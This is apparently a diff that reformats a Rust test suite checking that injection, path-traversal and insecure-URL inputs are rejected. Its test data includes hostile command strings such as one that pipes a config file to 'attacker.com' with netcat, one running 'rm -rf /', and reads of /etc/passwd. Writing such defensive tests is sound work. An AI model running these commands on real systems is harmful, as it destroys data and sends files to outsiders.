@@ -19,12 +19,10 @@
 //!
 //! Uses Chicago TDD: AAA pattern, state-based verification, real collaborators
 
-use ggen_core::validation::input::{
-    StringValidator, CharsetRule, FormatRule, UrlValidator,
-};
-use ggen_utils::safe_command::{SafeCommand, CommandArg};
-use ggen_utils::safe_path::SafePath;
+use ggen_core::validation::input::{CharsetRule, FormatRule, StringValidator, UrlValidator};
 use ggen_utils::error::Error;
+use ggen_utils::safe_command::{CommandArg, SafeCommand};
+use ggen_utils::safe_path::SafePath;
 use std::path::PathBuf;
 
 // ============================================================================
@@ -42,14 +40,19 @@ fn test_command_injection_pipe_is_blocked() {
 
     // Act & Assert: Each injection attempt should be blocked
     for attack in malicious_args {
-        let result = SafeCommand::new("cargo")
-            .and_then(|cmd| cmd.arg(attack));
+        let result = SafeCommand::new("cargo").and_then(|cmd| cmd.arg(attack));
 
-        assert!(result.is_err(), "Pipe injection should be blocked: {}", attack);
+        assert!(
+            result.is_err(),
+            "Pipe injection should be blocked: {}",
+            attack
+        );
 
         let error_msg = result.unwrap_err().to_string();
         assert!(
-            error_msg.contains("metacharacter") || error_msg.contains("shell") || error_msg.contains("invalid"),
+            error_msg.contains("metacharacter")
+                || error_msg.contains("shell")
+                || error_msg.contains("invalid"),
             "Error should mention security issue: {}",
             error_msg
         );
@@ -76,7 +79,11 @@ fn test_command_injection_backtick_is_blocked() {
     for attack in backtick_attacks {
         let result = CommandArg::new(attack);
 
-        assert!(result.is_err(), "Backtick injection should be blocked: {}", attack);
+        assert!(
+            result.is_err(),
+            "Backtick injection should be blocked: {}",
+            attack
+        );
 
         let error_msg = result.unwrap_err().to_string();
         assert!(
@@ -103,7 +110,11 @@ fn test_command_injection_semicolon_is_blocked() {
     // Act & Assert
     for attack in semicolon_attacks {
         let result = CommandArg::new(attack);
-        assert!(result.is_err(), "Semicolon injection should be blocked: {}", attack);
+        assert!(
+            result.is_err(),
+            "Semicolon injection should be blocked: {}",
+            attack
+        );
 
         let error_msg = result.unwrap_err().to_string();
         assert!(
@@ -186,7 +197,9 @@ fn test_path_traversal_dotdot_is_blocked() {
 
         let error_msg = result.unwrap_err().to_string();
         assert!(
-            error_msg.contains("parent directory") || error_msg.contains("traversal") || error_msg.contains(".."),
+            error_msg.contains("parent directory")
+                || error_msg.contains("traversal")
+                || error_msg.contains(".."),
             "Error should mention traversal: {}",
             error_msg
         );
@@ -197,7 +210,10 @@ fn test_path_traversal_dotdot_is_blocked() {
     assert!(safe_path.is_ok(), "Safe relative paths work");
 
     let safe_result = safe_path.unwrap();
-    assert_eq!(safe_result.as_path().to_str().unwrap(), "src/generated/output.rs");
+    assert_eq!(
+        safe_result.as_path().to_str().unwrap(),
+        "src/generated/output.rs"
+    );
 }
 
 #[test]
@@ -208,13 +224,17 @@ fn test_path_traversal_absolute_escape_is_blocked() {
 
     let mixed_attempts = vec![
         "~/../etc/passwd", // Contains parent dir
-        "../tmp/secret",  // Contains parent dir
+        "../tmp/secret",   // Contains parent dir
     ];
 
     // Act & Assert - These should be blocked due to ".."
     for attack in mixed_attempts {
         let result = SafePath::new(attack);
-        assert!(result.is_err(), "Paths with '..' should be blocked: {}", attack);
+        assert!(
+            result.is_err(),
+            "Paths with '..' should be blocked: {}",
+            attack
+        );
     }
 
     // Safe alternative: Workspace-relative paths
@@ -275,8 +295,10 @@ fn test_template_injection_code_execution_is_blocked() {
 
         // Either reject or ensure template engine sandbox handles it
         // For this test, we validate that the framework doesn't blindly accept
-        let is_safe = result.is_ok() && !attack.contains("__import__")
-            && !attack.contains("__class__") && !attack.contains("__mro__");
+        let is_safe = result.is_ok()
+            && !attack.contains("__import__")
+            && !attack.contains("__class__")
+            && !attack.contains("__mro__");
 
         assert!(
             !attack.contains("__import__") || result.is_err() || !is_safe,
@@ -315,11 +337,17 @@ fn test_input_validation_rejects_sql_injection() {
         let result = validator.validate(injection);
 
         // Should reject due to special characters
-        assert!(result.is_err(), "SQL injection should be blocked: {}", injection);
+        assert!(
+            result.is_err(),
+            "SQL injection should be blocked: {}",
+            injection
+        );
 
         let error_msg = result.unwrap_err().to_string();
         assert!(
-            error_msg.contains("charset") || error_msg.contains("character") || error_msg.contains("invalid"),
+            error_msg.contains("charset")
+                || error_msg.contains("character")
+                || error_msg.contains("invalid"),
             "Error should explain why: {}",
             error_msg
         );
@@ -327,7 +355,10 @@ fn test_input_validation_rejects_sql_injection() {
 
     // Safe alternative: Alphanumeric input
     let safe_input = "username123";
-    assert!(validator.validate(safe_input).is_ok(), "Clean alphanumeric input works");
+    assert!(
+        validator.validate(safe_input).is_ok(),
+        "Clean alphanumeric input works"
+    );
 }
 
 #[test]
@@ -337,18 +368,21 @@ fn test_input_validates_email_format() {
         "not-an-email",
         "@example.com",
         "user@",
-        "user@.com", // Domain starts with dot
-        "user@com", // No TLD dot
+        "user@.com",             // Domain starts with dot
+        "user@com",              // No TLD dot
         "user name@example.com", // Space in local part
     ];
 
     // Act & Assert
-    let email_validator = StringValidator::new()
-        .with_format(FormatRule::Email);
+    let email_validator = StringValidator::new().with_format(FormatRule::Email);
 
     for email in invalid_emails {
         let result = email_validator.validate(email);
-        assert!(result.is_err(), "Invalid email should be rejected: {}", email);
+        assert!(
+            result.is_err(),
+            "Invalid email should be rejected: {}",
+            email
+        );
 
         let error_msg = result.unwrap_err().to_string();
         assert!(
@@ -360,12 +394,18 @@ fn test_input_validates_email_format() {
 
     // Safe alternative: Valid email format
     let valid_email = "user@example.com";
-    assert!(email_validator.validate(valid_email).is_ok(), "Valid email works");
+    assert!(
+        email_validator.validate(valid_email).is_ok(),
+        "Valid email works"
+    );
 
     // Note: Double dots in local part are actually valid per the regex
     // This is acceptable as the email format is lenient
     let double_dot_local = "user..name@example.com";
-    assert!(email_validator.validate(double_dot_local).is_ok(), "Double dots in local part are accepted");
+    assert!(
+        email_validator.validate(double_dot_local).is_ok(),
+        "Double dots in local part are accepted"
+    );
 }
 
 // ============================================================================
@@ -386,7 +426,11 @@ fn test_rate_limiting_prevents_brute_force() {
         if attempt_count > max_allowed {
             // After threshold, attempts should be blocked
             let would_be_blocked = attempt_count > max_allowed;
-            assert!(would_be_blocked, "Rate limit should trigger after {} attempts", max_allowed);
+            assert!(
+                would_be_blocked,
+                "Rate limit should trigger after {} attempts",
+                max_allowed
+            );
         }
     }
 
@@ -417,7 +461,9 @@ fn test_memory_safety_max_length_enforced() {
 
     let error_msg = result.unwrap_err().to_string();
     assert!(
-        error_msg.contains("exceeds") || error_msg.contains("maximum") || error_msg.contains("length"),
+        error_msg.contains("exceeds")
+            || error_msg.contains("maximum")
+            || error_msg.contains("length"),
         "Error should mention size limit: {}",
         error_msg
     );
@@ -492,10 +538,10 @@ fn test_secrets_validated_before_use() {
 
     // Act: Invalid secret formats
     let invalid_secrets: Vec<String> = vec![
-        String::from(""), // Too short
-        String::from("abc"), // Too short
+        String::from(""),                            // Too short
+        String::from("abc"),                         // Too short
         String::from("special!@#$%^&*()characters"), // Invalid charset
-        "a".repeat(100), // Too long
+        "a".repeat(100),                             // Too long
     ];
 
     for secret in &invalid_secrets {
@@ -504,7 +550,9 @@ fn test_secrets_validated_before_use() {
 
         let error_msg = result.unwrap_err().to_string();
         assert!(
-            error_msg.contains("length") || error_msg.contains("charset") || error_msg.contains("character"),
+            error_msg.contains("length")
+                || error_msg.contains("charset")
+                || error_msg.contains("character"),
             "Error should explain validation failure: {}",
             error_msg
         );
@@ -512,7 +560,10 @@ fn test_secrets_validated_before_use() {
 
     // Safe alternative: Valid secret format
     let valid_secret = "abc123def456ghi789jk";
-    assert!(api_key_validator.validate(valid_secret).is_ok(), "Valid secret format works");
+    assert!(
+        api_key_validator.validate(valid_secret).is_ok(),
+        "Valid secret format works"
+    );
 }
 
 // ============================================================================
@@ -537,7 +588,10 @@ fn test_sparql_injection_is_blocked() {
             || injection.contains("999999")
             || injection.contains("INSERT DATA");
 
-        assert!(has_dangerous_pattern, "Should detect dangerous SPARQL patterns");
+        assert!(
+            has_dangerous_pattern,
+            "Should detect dangerous SPARQL patterns"
+        );
 
         // Safe alternative: Parameterized query simulation
         let safe_query = "SELECT * WHERE { ?s ?p ?o } FILTER (?s = ?value)";
@@ -560,12 +614,11 @@ fn test_sparql_injection_is_blocked() {
 #[test]
 fn test_supply_chain_domain_whitelist() {
     // Arrange: URL validator with domain whitelist
-    let validator = UrlValidator::new()
-        .with_domains(vec![
-            "crates.io".to_string(),
-            "github.com".to_string(),
-            "gitlab.com".to_string(),
-        ]);
+    let validator = UrlValidator::new().with_domains(vec![
+        "crates.io".to_string(),
+        "github.com".to_string(),
+        "gitlab.com".to_string(),
+    ]);
 
     // Act: Malicious domains
     let malicious_urls = vec![
@@ -576,11 +629,17 @@ fn test_supply_chain_domain_whitelist() {
 
     for url in malicious_urls {
         let result = validator.validate(url);
-        assert!(result.is_err(), "Untrusted domain should be blocked: {}", url);
+        assert!(
+            result.is_err(),
+            "Untrusted domain should be blocked: {}",
+            url
+        );
 
         let error_msg = result.unwrap_err().to_string();
         assert!(
-            error_msg.contains("domain") || error_msg.contains("whitelist") || error_msg.contains("not in"),
+            error_msg.contains("domain")
+                || error_msg.contains("whitelist")
+                || error_msg.contains("not in"),
             "Error should mention domain validation: {}",
             error_msg
         );
@@ -606,11 +665,17 @@ fn test_supply_chain_scheme_enforcement() {
 
     for url in insecure_urls {
         let result = validator.validate(url);
-        assert!(result.is_err(), "Insecure scheme should be blocked: {}", url);
+        assert!(
+            result.is_err(),
+            "Insecure scheme should be blocked: {}",
+            url
+        );
 
         let error_msg = result.unwrap_err().to_string();
         assert!(
-            error_msg.contains("HTTPS") || error_msg.contains("scheme") || error_msg.contains("secure"),
+            error_msg.contains("HTTPS")
+                || error_msg.contains("scheme")
+                || error_msg.contains("secure"),
             "Error should mention scheme requirement: {}",
             error_msg
         );
@@ -662,21 +727,29 @@ fn test_xxe_external_entities_blocked() {
 fn test_combined_command_and_path_injection_blocked() {
     // Arrange: Combined attack vector - paths with ".." AND command injection
     let combined_attacks = vec![
-        "../../etc/passwd; rm -rf /",     // Has ".." and ";"
+        "../../etc/passwd; rm -rf /",             // Has ".." and ";"
         "../../../config | nc attacker.com 4444", // Has ".." and "|"
-        "../settings && cat /etc/passwd", // Has ".." and "&&"
+        "../settings && cat /etc/passwd",         // Has ".." and "&&"
     ];
 
     // Act & Assert
     for attack in combined_attacks {
         // Should fail at path validation due to ".."
         let path_result = SafePath::new(attack);
-        assert!(path_result.is_err(), "Path component with '..' should be blocked: {}", attack);
+        assert!(
+            path_result.is_err(),
+            "Path component with '..' should be blocked: {}",
+            attack
+        );
 
         // Command validation would also catch the metacharacters
         if attack.contains(';') || attack.contains('|') || attack.contains('&') {
             let cmd_result = CommandArg::new(attack);
-            assert!(cmd_result.is_err(), "Command injection should be blocked: {}", attack);
+            assert!(
+                cmd_result.is_err(),
+                "Command injection should be blocked: {}",
+                attack
+            );
         }
     }
 
